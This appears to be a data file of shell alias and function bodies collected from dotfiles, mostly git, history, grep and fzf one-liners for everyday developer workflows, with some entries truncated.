"hub browse $(ghq list | peco | cut -d ""/"" -f 2,3 )"
"hub browse $(ghq list | peco --prompt ""[hub browse]"" | cut -d ""/"" -f 2,3)"
"hub browse $(ghq list | peco --prompt ""[browse src]"" | cut -d ""/"" -f 2,3)"
"hub browse $(ghq list | fzf | cut -d ""/"" -f 2,3)"
"hub browse $(ghq list | fzf --prompt ""hub> "" --height 40% --reverse | cut -d ""/"" -f 2,3)"
"hub browse $(ghq list | fzf --no-sort | cut -d ""/"" -f 2,3)"
"http POST https://4v8uog9pw8.execute-api.us-west-2.amazonaws.com/api/process/message username=nakul command=gg | jq -c "".result.response_message.goals[] | .name,.steps[]"""
"http POST https://4v8uog9pw8.execute-api.us-west-2.amazonaws.com/api/process/message username=nakul command=gg | jq -c "".result.response_message.goals[] | .name+\"" \""+.progress+\"" \""+.progress_bar+\"" \"""""
"howdoi' ~/.zshrc || echo eval ""\nalias ß=howdoi"" >> ~/.zshrc"
"host myip.opendns.com resolver1.opendns.com | grep ""myip.opendns.com has"" | awk ""{print $4}"""
"history|tail -n1|sed -e ""s/^\s*[0-9]\+\s*//"" -e ""s/;\s*alert$//"""
"history|tail -n1|sed -e ""s/^\s*[0-9]\+\s*//"" -e ""s/;\s*alert$//"" -e ""s/\s*A$//"""
"history|egrep -i "".*\!*""|tail -40"
"history-all|sed -e ""s/^ *//""|awk -F"" "" "
"history | tail -n1 | sed -e ""s/^\s*[0-9]\+\s*//"" -e ""s/;\s*alert$//"""
"history | sed 's/[0-9 ]\{1,\}//' | grep -i"
"history | perl -pe ""s/^(\d|\s)+//"""
"history | grep cd | grep -vw ""cd .."""
"history | grep $(date +%-m/%e/%Y | sed ""s/ //g"")"
"history | grep ""docker run"" | grep -i "
"history | cut -c8- | sed -e ""s/^/$ /"""
"history | command grep -vF ""history"" | grep "
"history | awk '{h[$2]++}END{for(i in h){print h[i],i|\"
"history | awk '{a[$2]++}END{for(i in a){print a[i] "" "" i}}' | sort -rn"
"history | awk ""{print \$1- ($HISTCMD + 1), \$0}"" | tail"
"history 1 | perl -ne ""print \$1 if /^(?:\s*\d+\s+)?(?:\[.+?\])?\s*(.*)\$/"" | _capture_output"
"history 0 | tail -n 100 | perl -pe ""s/^\d+\*? +//"""
"hg up -r $(hglg | head -n 1 | sed ""s#^.*\([0-9]*\):#\1#"")"
"hg log -G -l9 --template 'changeset: {rev}:{node|short}\\nbranch: {branch}\\nparent: {p1rev}:{p1node|short}{ifeq(p2rev, \"
"hg log --template ""changeset:{rev}:{node|short} ({phase})\ntags:{tags}\nuser:{author}\ndate:{date|isodate}\nsummary:{desc}\n\n"""
"hg in | grep ""branch:\s\+$(hg branch)"" | wc -l"
"helm list -a -d -r --namespace $(kubectl config get-contexts | egrep ""\*"" | awk "
"helm list --deployed | grep -v ""NAME"" | awk "
"head -n1 | pbcopy ; (sleep 45 && echo ""empty"" | pbcopy)&"
"head -n 1 | tr -t ""\n"" ""\0"" | wl-copy"
"head -c 8 /dev/urandom | shasum | cut -d "" "" -f 1"
"head -1 | tr ""\t"" ""\n"" | nl"
"head -1 | cut -d : -f 2 | python -c ""import sys; nums = [float(i) for i in sys.stdin.read().split()]; print sum(nums)/len(nums)"""
"hdate --hebrew|cut -f 3 -d ','|grep -v '^$'"
"hasinternet && parrotsay ""Yay ! Internet !"" || parrotsay ""No internets :("""
"h -i error ""info|success\w+"" ""warn\w+|exit\w+"""
"gvim -u NONE -U NONE --cmd ""set nocompatible | syntax on | filetype plugin indent on"""
"gvim -p $(git status --short |egrep ""^ M "" | cut -d"" "" -f3) -c ""tabdo Gdiff"""
"gtl | awk -F: ""{print; system(\""git -c color.diff=always --no-pager stash show -p \"" \$1)}"" | less -R +""/^stash.*"""
"gs|grep ""both modified""|sed -e ""s/#\tboth modified: /subl /g"""
"gss | wc -l | tr -d "" """
"gsettings set org.gnome.desktop.background picture-uri ""$(find ~/Pictures/Wallpapers/ | grep jpg | shuf -n1)"""
"gs | grep modified | awk ""{print \$2}"" "
"gs | grep deleted | awk ""{print \$2}"" "
"growlnotify ""$(history|tail -n1|sed -e "
"grlb | grep ""^-"" | cut -c2-"
"grep-status -FStatus -sInstalled-Size,Package -n ""install ok installed"" | paste -sd "" \n"" | sort -rn"
"grep gi[t] ~/dotfiles/bashrc | sed ""s/^alias\ //"" | grep --color=auto -e ""^[a-z]\+"""
"grep autostart /etc/supervisord.d/setup.ini||sed -i -e ""/command/a autostart=false"" /etc/supervisord.d/setup.ini"
"grep alias ~/.bashrc | grep -v \# | cut -d "" "" -f2 -f3 "
"grep ^10\. /var/log/openvpn/openvpn-status.log*|cut -d: -f2|sort -t, -k2"
"grep HostName ~/.ssh/config | cut -c12- | fzy -l 24 -p ""HOSTS > """
"grep -vE ""^$|^ *(#|;)"""
"grep -vE ""^#|^\s+#|^$"""
"grep -vE ""^#|^$|^[\w]+#"""
"grep -v rs02 dcmConvert_cenc.cfg.draft | dcm_remove_rs |
"grep -v imsmanifest | gawk -vORS=, '{ print $1 }' | sed 's/,$/\n/'"
"grep -v -E ""(^$|^#|^!)"""
"grep -v ""^$"" | grep -v ""//"" | grep -v "";$"""
"grep -v ""^#"" | grep -v ""^[[:space:]]*#"" | grep -v ""^$"""
"grep -rnIsT ""TODO: (N Hutton)"" ./ | sed ""s/:/ /"" | tee ./alltodos && v ./alltodos"
"grep -rE ""state:\s*working"" *.text | awk -F: ""{print $1}"" | xargs"
"grep -r --include=""*.sh"" -l query | xargs grep -c query | sort -n -t: -k2,2 -r"
"grep -q ""/root/bin/stk:"" <<<""$PATH"" || export PATH=""/root/bin/stk:$PATH"""
"grep -oE ""^[[a-z0-9.,:-]+"" ~/.ssh/known_hosts | tr "","" ""\n"" | tr -d "
"grep -oE ""\-[0-9]{1,2}{3,4}-"" | tail -1 |cut -d ""-"" -f 2"
"grep -nr ""TODO"" err.txt generated.file succ.txt | sed ""s/\([^:]*TODO.*:\)\|\(\s*\*\/$\)/\x1B[0m/g"""
"grep -n color \$1 | perl -F'\s|:' -anle'/(#[\da-fA-F]{3,6})/; print qq{\$F[0] \$1}' "
"grep -n -R ""TODO\|FIXME\|XXX"" ."
"grep -i http ""$1"" | awk ""{print $2}"" | sed -e ""s/^.*\""\(.*\)\"".*$/\1/"" > ""$2"""
"grep -i 'Begin final coordinates' -A \$(grep nat input.txt | awk '{printf \$3+2}' | sed 's/,//') output.txt"
"grep -i ""sshd"" /var/log/auth.log | grep -P ""\d+\.\d+\.\d+\.\d+"" --color=always | less -R"
"grep -i ""servername"" /opt/apache/config/* || grep -i ""servername"" /etc/httpd/conf.d/* && ls /opt"
"grep -e "".*() {"" ~/bin/* | cut -d "":"" -f2 | cut -d ""("" -f1"
"grep -RoPish ""ppa.launchpad.net/[^/]+/[^/ ]+"" /etc/apt | sort -u | sed -r ""s/\.[^/]+\//:/"""
"grep -Ev '\\/{0,1}(\\.git|node_modules|.idea)\\/{0,1}'"
"grep -Ev ""^\s*(;|#|$)"""
"grep -Ev ""^\s*(#|$)"" /etc/fstab | column -t"
"grep -Ev ""^[\ ]"" | sed ""/^\s*$/d"" | cut -d "":"" -f1"
"grep -Ev ""^(\s*|#.*|\s*#.*)$"""
"grep -Ei ""installed|removed|upgraded"" /var/log/pacman.log"
"grep -E -o ""[0-9a-zA-Z-]+\.[0-9a-zA-Z-]+\.[0-9]+"" ~/Dropbox/Apps/neutriNote/bib/Aspiro_1.8.bib | sort | uniq > ~/.vim/keywords.txt"
"grep -E -o ""@.*"" ~/Dropbox/todo/todo.txt | sort | uniq"
"grep -E '(^\* |License:)' | ruby -pe 'gsub(/\s+\([^)]+\)\s+/, \"
"grep -E ""eth0:.*(up|down)"" /var/log/everything.log | tail"
"grep -E ""(Processing|Rendered|Completed)"" log/development.log"
"grep -B1 ""Name $dom"" $conf|head -1; perl -ne ""print if /$dom/ .. /Host>$/"" $conf; echo ""Curl: ""; curl $dom | head"
"grep --extended-regexp ""pac(new|save)"" /var/log/pacman.log | tail"
"grep --exclude-dir=.git -rEI ""TODO|FIXME|todo"" . 2>/dev/null"
"grep 'duration: [0-9]\{3,6\}' | sort -k 6,6 -n | tail -n 20"
"grep ""upgraded"" /var/log/pacman.log | tail -n45 | cut -d"" "" -f5-8"
"grep ""el."" | sort | uniq -c"
"grep ""^plugins"" ~/.zshrc | sed -r ""s/plugins\=//g;s/[(]|[)]//g"""
"grep ""WEBAPI_ERR_"" $s/webapi-DSM5/include/webapi-DSM5/WebAPI-DSM5.h | awk ""{print \$1,\$2,\$3}"" | grep -v ""^#"""
"grep ""More info"" | sort | uniq -c"
"grep ""ERROR\|FATAL\|Exception"" $FUSIONWORKS_HOME/UnifiedLogging/UL_$(date +""%Y%m%d"")
"grep "":e "" ~/.viminfo | cut -f2 -d\ | cat -n"
"grep "": WARNING:\|: ERROR:\|: INFO:"""
"grep "".*"" -r -I 2>&1 | pyg -l d | less -r"
"grep "".*"" -d skip -I -r 2>&1 | pyg -l d | less -r"
"grep ""$1"" *.log|cut -d"":"" -f l|wc"
"grep ""$(date +%Y-%m-%d)"" /var/log/pacman.log | grep -i ""warn\|err"""
"grc ps -a -r -f -o %cpu,user | grep -v grep | grep"
"grc ls -agh --sort=extension --time-style=""+| %l:%M %d %b |"""
"grc --colour=auto svn status | grep -v ""^?"" | grep -v ""^ M"""
"gradle shadowJar && terminal-notifier -sound ""default"" -timetle ""gradle shadowJar"" -message ""Build SUCCESS!"" || (terminal-notifier -sound ""Basso"" -title ""gradle shadowJar"" -message ""Build FAILED!"" && return 1)"
"gpg --list-keys --keyid-format long | egrep -o ""^pub.*/\w+"" | cut -d ""/"" -f 2"
"gpg --export --armor $GPG_KEY_ID | pbcopy | printf ""✓ Public GPG key copied to pasteboard.\n"""
"gpg --card-status|grep ""General key info""; cd ~/Dev; for d in *; do (if [ -d ""$d"" ]; then cd ""$d""; echo $d; gdirup; fi); done; echo ""=== Homebrew""; brew update >/dev/null 2>&1; brew upgrade; brew cleanup; brew outdated; echo ""=== Rubygems""; gem update; gem update --system; echo ""=== Pip""; pip3 freeze --local | xargs pip3 install -U --quiet; echo ""=== Vim""; vim -i NONE -c VundleUpdate -c quitall; echo ""=== npm""; npm update -g npm; npm update -g; npm outdated -g"
"google-chrome-stable || chromium
"google-chrome https://github.com/$(git remote -v | sed -n ""s/origin.*git\@github.com\:\(.*\/.*\).git.*(push)/\1/p"")/compare/$(git symbolic-ref HEAD | awk -F ""/"" ""{print \$3}"")\?expand=1"
"go test -v . | sed /PASS/s//$(printf ""\033[32mPASS\033[0m"")/ | sed /FAIL/s//$(printf ""\033[31mFAIL\033[0m"")/"
"glxinfo|egrep ""OpenGL vendor|OpenGL renderer"""
"glxinfo|egrep ""OpenGL vendor|OpenGL renderer"" && glxheads"
"glxinfo | egrep ""OpenGL vendor|OpenGL renderer"""
"gluj -m | egrep --color ""[A-Z]|$"""
"gls -FAh | egrep ""^\."" | colorit"
"gls --color=auto -d .[[:alnum:]]* 2> /dev/null || echo ""No hidden file here..."""
"gls --color -tltX | awk ""{print \$6, \$7, \$8, \$9}"" | column -t"
"gls --color -lXa | awk ""{print \$6, \$7, \$8, \$9}"" | column -t"
"glg $(git show-ref | cut -d "" "" -f 2 | grep -v stash$)"
"glg $(git show-ref | cut -d "" "" -f 2 | grep -v stash$) HEAD"
"gitk `for b in $(git branch); do echo ""$b""; done | tr -d ""*"" | xargs` --"
"git_log --first-parent $(nvim --version | grep commit | cut -d"" "" -f2).."
"git_branch_history | nl -w2 -s"": "" | oilr "
"git_bigfile_check | iselect -am t ""select files to remove"" | git_bigfile_clean - && git_bigfile_shrinked_push"
"git-branch --no-color | egrep ""^\*"" | cut -c 3-"
"git yolo || git commit -m""$(curl -s whatthecommit.com/index.txt)"""
"git worktree remove ""$(git worktree list | fzf | cut -f 1 -d "" "")"""
"git worktree prune ; git worktree list | grep --color -E ""$(gwd).*|$"" ; git branch ; git status --short ; git stash list"
"git task | tr -d ""\n"" | pbcopy"
"git tag | xargs -I@ git log --format=format:""%ci %h @%n"" -1 @ | sort"
"git tag | sed -e 's/[a-z-]\{3,\}//' | sort -V"
"git tag | choose -ip ""Checkout tag:"" | xargs --no-run-if-empty git checkout"
"git tag --sort v:refname | grep ""^v"" | tail -1"
"git switch $(git branch | fzf | sed -e ""s/^\*//"")"
"git sw | grep -E ""^\+"" | grep -C8 -i todo"
"git svn rebase || ( git stash ; git svn rebase ; git stash pop )"""
"git svn log --oneline --show-commit | cut -d '|' -f 1,2"
"git svn info | grep ^Rev | sed ""s/.* //;"""
"git submodule foreach --recursive ""git checkout master && git pull && git add . && git commit -m \""update submodule\"" || return 0"""
"git submodule foreach ""git status || :"""
"git submodule --quiet foreach --recursive ""git remote -v""|grep -v push|grep -v matt"
"git submodule --quiet foreach ""(git status -a > /dev/null && echo \$path) || true"""
"git status|grep ""On branch""|grep -Eo ""[^ ]+$"""
"git status | sed -E ""s/.*modified: *([^ ]*).*/\1/;t;d"" | xargs git add -f"
"git status | head -1 | sed -e ""s/On branch //"""
"git status | grep modified | sed -e ""s/.*modified: *//"""
"git status | grep -P ""#\t"" | cut -c 15-"
"git status | grep ""modified:"" | wc -l"
"git status | grep ""modified:"" | third"
"git status | grep ""both modified:"" | sed ""s/^.*both modified: *//g"""
"git status -vv || (echo ""/>svn status"" && svn status)"
"git status -uno | egrep -v ""out|*generated*"""
"git status -s | sed -n ""s/^\sD\s\(.*\)/\1/p"" | xargs git rm"
"git status -s | sed -e ""s?^\s??"" | cut -d"" "" -f2"
"git status -s | grep -e ""^\?\?"" | cut -c 4- >> .gitignore"
"git status -s | grep ""^ M "" | sed ""s/^ M //g"""
"git status -s | cut -d"" "" -f3 | xargs rubocop -a"
"git status -s | cut -d"" "" -f3 | xargs bin/rubocop -a"
"git status -s | awk ""{if ($1 == ""M""){print $2}}"" | sed "":a;N;$!ba;s/\n/ /g"""
"git status --short || (echo ""/>svn status"" && svn status)"
"git status --short | grep -E ""^(?:U|AA)"""
"git status --short | cut -d "" "" -f 3 | xargs chmod -x"
"git status --short | cut -d "" "" -f 3 | xargs chmod +x"
"git status --short | awk ""{ print \$2; }"" | xargs mvim"
"git status --short -u | sed ""s/\?\?//"" | xargs rm -r"
"git status --short --untracked-files=all | grep -v ""^ D "" | cut -c4-"
"git status --short --untracked-files=all | grep ""^ D "" | cut -c4-"
"git status --porcelain | ruby -e ""puts STDIN.read.scan(/^\\s+D\\s+(.+)\$/).join(\""\\n\"")"" | xargs git rm"
"git status --porcelain | grep -v -e ""\.lock$"" | cut -c 4-"
"git status --porcelain | grep -E ""\?\?"" | awk "
"git status --porcelain | grep ""?"" | cut -c4- >> $(git rev-parse --show-toplevel)/.gitignore"
"git status --porcelain | cut -d "" "" -f 3 | cut -d ""/"" -f 1 --complement"
"git status --porcelain | awk ""{print $2}"" | imageOptim"
"git status --porcelain ./src | cut -d"" "" -f3 | xargs -n 1 -P 10 git submodule update --init"
"git status --porcelain --ignore-submodules | cut -f 3 -d"" "" | xargs vim -pO ${1}"
"git status && git fetch && git for-each-ref --sort=committerdate refs/heads/ --format=""%(color:cyan)%(refname:short)%(color:reset)😄%(color:yellow bold)%(subject)%(color:reset)😄%(color:green)%(authordate)%(color:reset)"" --color=always | column -t -s ""😄"" | tail -25"
"git st | grep ""^ M"" | cut -f 3 -d \"
"git st -u | egrep -v ""(~$|swp$)"""
"git show-ref --head --hash ""^HEAD$"" 1>&2 | tr -d ""\n"" | xclip -in"
"git show --diff-filter=AM --pretty="""" --name-only HEAD | grep java$ | xargs -r google-java-format -i"
"git show --color | sed -E ""s/^([^-+ ]*)[-+ ]/\\1/"" | less -r"
"git show $(git log --pretty=oneline | fzf | cut -d="" "" -f1)"
"git show $(git log --pretty=oneline | fzf | cut -d"" "" -f1)"
"git show ""$(_git_pick_commit):$(fzf)"" | pygmentize | less -SRi"
"git s | grep "" D"" | awk -F"" "" "
"git rev-parse HEAD | tr -d ""\n"" | pbcopy"
"git rev-parse --show-toplevel || echo ""."""
"git rev-parse --show-toplevel 2> /dev/null && cd $(git rev-parse --show-toplevel) || echo ""Not a git repo"""
"git rev-parse --show-toplevel 2&> /dev/null && cd $(git rev-parse --show-toplevel 2&> /dev/null) || echo ""Not a git repository."" && test"
"git rev-parse --short HEAD | tr -d ""\n"" | pbcopy"
"git rev-parse --git-dir >/dev/null 2>&1 && cd `git rev-parse --show-toplevel` || echo ""Not in git repo"""
"git rev-parse --abbrev-ref HEAD | tr -d ""\n"" | pbcopy"
"git rev-parse --abbrev-ref HEAD | cut -d'-' -f 1,2 | copy"
"git rev-list --boundary ...master | grep ""^-"" | cut -c2-"
"git reset HEAD $(git diff --name-only --cached | fzf --multi | tr ""\n"" "" "")"
"git reset $(git merge-base master $(git branch | grep \* | cut -d "" "" -f2))"
"git reset $(git diff --name-only | fzf --multi | tr ""\n"" "" "")"
"git remote update origin --prune && git branch --merged | grep -v ""*"" | xargs git branch -D"
"git remote show origin | grep ""HEAD branch"" | sed ""s/.*: //"""
"git remote show origin | grep ""HEAD branch"" | cut -d "":"" -f 2"
"git remote prune origin && git branch | grep -v -e ""master"" -e ""*""| xargs -L 1 git branch -d"
"git remote prune origin && git branch | grep -v ""master"" | xargs git branch -D"
"git remote prune origin && git branch | grep -v ""develop"" | xargs git branch -D"
"git remote prune origin && git branch --merged | grep -v ""\*"" | xargs -n 1 git branch -d"
"git remote prune origin && git branch --merged master | grep -v ""\* master"" | xargs -n 1 git branch -d"
"git remote get-url upstream | sed -E ""s;git@github.com:(.*)/(.*)\.git;https://github.com/\1/\2/tree/develop-analyst/;g"" | xargs -I% open ""%$(git rev-parse --show-prefix)"""
"git remote get-url origin | sed -e ""s#:#/#"" -e ""s#git@#https://#"" | xargs open"
"git remote get-url origin | sed -e ""s#:#/#"" -e ""s#git@#https://#"" -e ""s/\.git$/\/issues\/new\//"" | xargs open"
"git remote get-url --push origin | sed -r ""s/^(git@github.com|hub):/https:\/\/github.com\//; s/.git$//"""
"git remote get-url --push origin | sed -r ""s/^(git@github.com|hub)://; s/.git$//"""
"git remote -v && git branch -a | head -n 10 && echo """" && git branch -a | grep ""\->"""
"git reflog | sed -n ""s/.*checkout: moving from . .. to \(.*\)/\1/p"" | sed ""2q;d"""
"git reflog | grep -Eo ""moving from ([^ ]*)"" | head -10"
"git reflog --pretty=format:"" %C(magenta)%h | %gd %C(#c0d6de)%an %C(blue)%gs %C(#99bcc9)| %s %C(yellow)%cr%C(reset)"""
"git rebase -i $(git log --date=short --pretty=""format:%C(yellow)%h %C(green)%cd %C(blue)%ae %C(red)%d %C(reset)%s"" |fzy| cut -d"" "" -f1)"
"git rebase -i $(git log --all --graph --oneline --decorate | fzf --reverse | sed -Ee ""s/.* ([a-f0-9]{6,}) .*/\1/"")"
"git rebase --interactive $(glo | fzf --ansi --no-sort | cut --delimiter="" "" --fields=1)"
"git push || echo ""DAMMIT"""
"git push origin `git status 2>&1 | head -n 1 | sed s""/On branch //g""`"
"git push origin `git branch | grep ""*"" | cut -d "" "" -f 2`"
"git push origin `(git branch | grep ""*"" | sed ""s/* //"")`"
"git push origin HEAD || (notify ""push failed"" ""Git"" && false)"
"git push origin :$(git br | grep ""*"" | cut -d "" "" -f2)"
"git push origin --set-upstream $(git branch | grep ""^*"" | tr -d ""* "")"
"git push origin && ( [ ""master"" = ""$(current_branch)"" ] || echo -e ""\nOpen a PR: $(github_link)?expand=1\n"")"
"git push origin $(gitb | fgrep ""*"" | cut -d "" "" -f2)"
"git push origin $(git branch | head -n 1 | cut -d "" "" -f 2-)"
"git push origin $(git branch | grep \* | cut -d "" "" -f2)"
"git push origin $(git branch | grep \* | cut -d "" "" -f2) --force-with-lease"
"git push origin $(git branch | grep ""^*"" | sed -e ""s/^*\?\s*//g"")"
"git push origin $(git branch | grep ""\*"" | sed s:^..::g )"
"git push origin $(git branch | grep ""*"" | sed -e ""s/^\*\s*//g"")"
"git push heroku master && growl_pass -n heroku -m ""Deployment was successful."" || growl_fail -n heroku -m ""Deployment failed !"""
"git push -u origin `git branch | grep \* | cut -d "" "" -f2`"
"git push -u origin `git branch | grep ""*"" | cut -d "" "" -f 2`"
"git push -u origin $(git branch | grep \* | cut -d "" "" -f2)"
"git push -u origin $(git branch | grep ""\*"" | cut -c 3-)"
"git push --set-upstream origin `git rev-parse --abbrev-ref HEAD`; CURRENT_BRANCH=`git rev-parse --abbrev-ref HEAD`; TARGET_BRANCH=`git rev-parse --abbrev-ref HEAD | sed -e ""s/^\([^@]*\)$/\1@master/"" | sed -e ""s/^.*@//""`; MESSAGE=`git log -1 --grep "
"git push --set-upstream origin `git branch | grep ""*"" | tr -d ""*""`"
"git push --set-upstream origin $(git br | grep ""*"" | cut -d "" "" -f2)"
"git push --force staging `git branch | grep ""*"" | sed ""s/* //""`"
"git pullrequest create $(git branch | grep \* | cut -d "" "" -f2) master"
"git pull origin `git status 2>&1 | head -n 1 | sed s""/On branch //g""`"
"git pull origin `git branch | grep ""*"" | cut -d "" "" -f 2`"
"git pull origin $(git branch | grep \* | sed ""s/*\s*//g"")"
"git pull origin $(git branch | grep \* | cut -d "" "" -f2)"
"git pull origin $(git branch | grep ""\*"" | sed s:^..::g )"
"git pull --rebase origin $(git config --get gitflow.branch.develop || echo ""develop"")"
"git pull --rebase origin $(git branch | grep \* | cut -d "" "" -f2)"
"git pull --rebase origin $(git branch | grep ""*"" | sed -e ""s/^\*\s*//g"")"
"git pull --rebase && git pull --prune && git branch --merged | grep -v ""\*"" | xargs -n 1 git branch -d"
"git pull --rebase && bundle && bundle exec rake && cd data && bundle && bundle exec rspec && cd .. && echo ""All tests passed"" && alert ""All tests passed"" || alert ""Something failed"""
"git pull --prune && git submodule foreach --recursive ""git pull --prune || :"""
"git prune remote origin ; git branch --merged master | grep -v ""\* master"" | xargs -n 1 git branch -d"
"git merged | grep -v ""master$"" | xargs git branch -d"
"git merge-base origin/dev HEAD | tr -d ""\n"" | xargs -0 -I ancestor git log --oneline ancestor..HEAD"
"git ls-tree -r HEAD --name-only | perl -ne ""print \$1 if m/\.([^.\/]+)$/"" | sort -u"
"git ls-tree -r HEAD --name-only --full-name | xargs file | egrep "".*:\s"" --color"
"git ls-files| xargs du | awk '{sum += $1};END {print sum/1024, "
"git ls-files | grep -v ""i18n"" | xargs grep -s --color=auto"
"git ls-files | grep ""\.go$"" | xargs cloc"
"git ls-files pubspec.lock --error-unmatch &>/dev/null && echo ""Not removing pubspec.lock - it is tracked"" || (rm pubspec.lock && echo ""Removed pubspec.lock"")"
"git ls-files pubspec.lock --error-unmatch $>/dev/null && echo ""Not removing pubspec.lock - it is tracked"" || (rm pubspec.lock && echo ""Removed pubspec.lock"")"
"git ls-files -v | grep ""^h "" | cut -d"" "" -f2-"
"git ls-files -u | awk ""{print \$NF}"" | uniq"
"git ls-files -m | grep "".php$"" | xargs -n1 -P8 php -l"
"git ls-files -m -o --exclude-standard | fzf --print0 -m --preview-window right:75% --preview ""git diff --color=always {}"" | xargs -0 -t -o git add"
"git ls-files -dmo --exclude-standard | grep ""$*"" | xargs -r git add"
"git ls-files --unmerged | awk ""{print \$4}"" | uniq"
"git ls-files --other --modified --exclude-standard|while read filename; do echo -n ""$(stat -c%y -- $filename 2> /dev/null) ""; echo $filename; done|sort"
"git ls-branches -lrsC | choose -ip ""Checkout branch:"" | xargs --no-run-if-empty git checkout"
"git ls-branches -lrC | choose -ip ""Rebase \""""$(git ls-branches -c)""\"" onto branch:"" | xargs --no-run-if-empty git rebase"
"git ls-branches -lrC | choose -ip ""Merge branch to \""""$(git ls-branches -c)""\"":"" | xargs --no-run-if-empty git merge"
"git ls-branches -lC | choose -imp ""Delete branch(es):"" | xargs --no-run-if-empty git branch --delete"
"git log | head -n 1|cut -d "" "" -f 2"
"git log | grep svn-id|awk -F""@"" \"
"git log origin/master --author `git config --get user.name` --since ""5 days ago"" --oneline | tac | sed ""s/^\w*\ *//"
"git log -20 --stat --oneline --pretty=format:""%Cred%h%Creset %C(yellow)%d%Creset %C(yellow)%s %Cgreen(%cr) %C(bold blue)<%an>%Creset"" --abbrev-commit | grep -E ""/|$"""
"git log -20 --author=""axel"" --stat --oneline --pretty=format:""%Cred%h%Creset %C(yellow)%d%Creset %C(yellow)%s %Cgreen(%cr) %C(bold blue)<%an>%Creset"" --abbrev-commit | grep -E ""/|$"""
"git log -15 --pretty=format:""%C(#343d4f)%h~%C(#ffffff)%s~%C(green nobold)%D"" | column -t -s ""~"" | nowrap"
"git log -10 --oneline | nl -v0 | sed ""s/^ \+/&HEAD~/"""
"git log -1 | head -1 | awk ""{print \$2}"""
"git log -1 | grep "" B"" | awk "
"git log -1 --pretty=%B | head -n 1 | tr -d ""\n"""
"git log -1 --pretty=%B | grep ""#"" | pbcopy"
"git log --since=1.day --pretty=format:""%Cblue%ar%Cgreen %s%Creset"" | sed -e ""s/^\([^\*]*\)//g"" | sed -e ""s/ \* /\n* /g""; echo """""
"git log --reverse --abbrev-commit --pretty=oneline origin/master |grep -i -e ""tagging"" -e ""gfs2"" -e ""dlm""|less"
"git log --reverse --abbrev-commit --pretty=oneline origin/master |grep -i -e ""kernel-3.10.0-"" -e ""gfs2"" -e ""dlm""|less"
"git log --pretty=oneline --abbrev-commit --since=""6am"" | perl -wpe ""s/^([^\s]+)/-/g"" | tail -r"
"git log --pretty=format:'%h - %an, %ar : %s' --graph --color=always | sed 's/^\(.\{160\}\).\+/\1/' |less -R"
"git log --pretty=format:'%C(dim white)%h%Creset %C(bold white)EML%aEEML%Creset %Cgreen%d%Creset %s' --color=always | sed 's/EML\(.\{1,7\}\).*@.*EML/EML\1 EML/; s/EML\(.\{7\}\).*EML/\1/' | less -R"
"git log --pretty=format:""%h$%ai$%cn$%G?: %s"" --graph | column -t -s ""$"" | less"
"git log --pretty=format:""%h | %cd | %s%d [%cn]%n"" --date=short"
"git log --pretty=format:""%h | %cd | %s%d [%cn]%n"" --date=short origin/`git symbolic-ref --short HEAD`"
"git log --pretty=format:""%h | %cd | %s%d [%cn]%n"" --date=short -14"
"git log --pretty=format:""%h | %cd | %s%d [%cn]%n"" --date=short -14 origin/`git symbolic-ref --short HEAD`"
"git log --pretty=format:""%h | %cd | %s%d [%cn]%n"" --date=short -14 --merges"
"git log --pretty=format:""%h | %cd | %s%d [%cn]%n"" --date=short -14 --graph"
"git log --pretty=format:""%h | %cd | %s%d [%cn]%n"" --date=short --merges"
"git log --pretty=format:""%h | %cd | %s%d [%cn]%n"" --date=short --graph"
"git log --pretty=format:""%h | %cd | %s%d [%cn]"" --date=short"
"git log --pretty=format:""%h | %cd | %s%d [%cn]"" --date=short -14"
"git log --pretty=format:""%h | %cd | %s%d [%cn]"" --date=short -14 --graph"
"git log --pretty=format:""%h | %cd | %s%d [%cn]"" --date=short --graph"
"git log --pretty=format:""%h - %an, %ar : %s"" | grep sean | less"
"git log --pretty=format:""%d"" | grep ""tag:"" | head -n 1"
"git log --pretty=format:""%cn %cd %s"" --date=iso |grep -e ""Merge branch"" -e ""Merge remote branch""|grep -v ""into"""
"git log --pretty=format:""%cd|%H|%s"" --date=short"
"git log --pretty=format:""%an | %ad | %s"""
"git log --pretty=format:""%ad %h by %an, %s"" --date=iso | sort -r | less"
"git log --pretty=format:""%Cred%h%Creset | %Cgreen%<(25)%an%Creset | %s"""
"git log --pretty=""%h %<(16)%an%<(12)%cr %s"" | peco | awk ""{ print \$1 }"""
"git log --pretty=""%ai %an"" | sort -u -k1,1 | sort -k2 -r"
"git log --oneline | sk | cut -d"" "" -f1"
"git log --oneline | nl -v0 | sed ""s/^ \+/&HEAD~/"""
"git log --oneline --format=""%Cgreen%h%Creset:%cr:%an:%s""|head -10|column -t -s:"
"git log --oneline ""$(git remote)/$(git branch | cut -c3-)..$(git branch | cut -c3-)"""
"git log --no-merges --date=short --pretty=format:""| %cd | %s [%an]"""
"git log --name-status --diff-filter=A --format=""> %aN"" --author=""ben"" | ack ""^A\t"" | sed -re ""s/^A\t//g"""
"git log --graph --pretty=""%n %C(bold blue)[state] %C(bold yellow)%D%Creset%n %C(bold blue)[info.] %Cred%h%Creset | %C(cyan)%an%Creset | %Cgreen%cr%Creset%n %C(bold blue)[title] %C(bold white)%s%Creset%n %C(bold blue)%n %w(,10,11)%b"""
"git log --graph --pretty=""%Cred%h %Creset| %Cgreen(%cr) %Creset| %Cblue%an: %C(reset)%s"""
"git log --graph --format=""%ai %h --%d %s [ --%an ]"" | perl -nle ""print qq{# \$_}"" | head"
"git log --graph --all --pretty=""%n %C(bold blue)[state] %C(bold yellow)%D%Creset%n %C(bold blue)[info.] %Cred%h%Creset | %C(cyan)%an%Creset | %Cgreen%cr%Creset%n %C(bold blue)[title] %C(bold white)%s%Creset%n %C(bold blue)%n %w(,10,11)%b"""
"git log --graph --all --decorate --oneline --abbrev-commit --pretty=format:""%>|(13)%Cred%h%Creset %Creset%Cgreen%>|(26)%cr %C(bold blue)%<(18,trunc)%an%Creset %C(magenta)%d %Creset%s"""
"git log --graph --all --decorate --oneline --abbrev-commit --pretty=format:""%>|(13)%Cred%h%Creset %Creset%Cgreen%>|(26)%cr %C(bold blue)%<(18,trunc)%an%Creset %C(magenta)%d %Creset%<(70,mtrunc)%s"""
"git log --graph --all --decorate --oneline --abbrev-commit --date=short-local --pretty=format:""%>|(13)%Cred%h%Creset %Creset%Cgreen%>|(26)%cd %C(bold blue)%<(18,trunc)%an%Creset %C(magenta)%d %Creset%<(70,mtrunc)%s"""
"git log --format=format:""%ad %an"" --date=short | sort | uniq -c"
"git log --format=""%ae %ad %s"" --date=short -100 | grep ""<your-email-address-here>"" | grep -oE ""[0-9\-]+ [A-Z]+-[0-9]+.*"""
